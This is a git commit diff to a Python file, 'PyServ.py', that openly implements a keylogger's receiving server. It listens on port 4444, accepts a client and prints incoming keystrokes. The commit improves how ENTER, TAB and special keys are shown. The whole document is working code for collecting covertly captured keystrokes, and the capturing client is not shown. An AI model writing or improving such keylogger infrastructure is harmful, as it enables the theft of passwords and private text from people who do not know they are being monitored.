4231764af4fe75e520f79e63bb5de68f627f46ce
ScDemon01 <alkrum01@gmail.com>
2024-08-31 04:16:54 +0300

    Updating The server

--- PyServ.py
+++ PyServ.py
@@ -1,9 +1,10 @@
 import socket
+import string
 
 
 def start_keylog_server():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host = '0.0.0.0'  # Listen on all available interfaces
+    host = '0.0.0.0'
     port = 4444
 
     try:
@@ -13,17 +14,33 @@ def start_keylog_server():
         client_socket, client_address = server_socket.accept()
         print(f"Connection from {client_address}")
 
-        keylog_data = ""
-
         while True:
             try:
                 char = client_socket.recv(1)
                 if not char:
+                    print("\nConnection closed by client.")
                     break
-                char = char.decode('utf-8')
-                print(char, end='', flush=True)
-            except:
-                print("--SK--") # If a special key was pressed
+                try: # Try treating the Character as ASCII, Looking for spaces, tabs and enters
+                    char = char.decode('utf-8')
+                    if char in string.printable:
+                        if char.isprintable() and char not in string.whitespace:
+                            print(f"{char}", end='', flush=True)
+                        elif char == '\r':
+                            print(f"\n<ENTER>")
+                        elif char == '\t':
+                            print(f"<TAB>", end='', flush=True)
+                        else:
+                            print(f"[{ord(char)}]", end='', flush=True)
+                    else:
+                        print(f"[{ord(char)}]", end='', flush=True)
+                except: # If it's a shift or another non-printable Key
+                    print("__Special_Key__")
+            except ConnectionResetError:
+                print("\nConnection reset by client.")
+                break
+            except Exception as e:
+                print(f"\nAn error occurred: {e}")
+                break
 
     except KeyboardInterrupt:
         print("\nServer shutting down...")
